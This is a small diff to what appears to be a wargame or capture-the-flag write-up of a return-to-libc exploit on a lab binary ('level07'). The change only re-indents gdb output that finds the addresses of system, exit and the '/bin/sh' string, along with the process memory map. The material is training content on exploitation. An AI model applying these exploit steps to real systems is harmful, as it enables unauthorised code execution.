@@ -155,15 +155,15 @@ Now, we just have to find the adresses of system, "/bin/sh", and exit (to gracef
 
 [source](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)
 
-(gdb) p system
-$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+	(gdb) p system
+	$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
 
-(gdb) p exit
-$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+	(gdb) p exit
+	$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
 
-(gdb) info proc map
-process 1936
-Mapped address spaces:
+	(gdb) info proc map
+	process 1936
+	Mapped address spaces:
 
 	Start Addr   End Addr       Size     Offset objfile
 	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
@@ -181,9 +181,9 @@ Mapped address spaces:
 	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
 	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
 	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
-(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
-0xf7f897ec
-1 pattern found.
+	(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
+	0xf7f897ec
+	1 pattern found.
 
 Now we need to convert these addresses to decimal and store them using the binary :
 
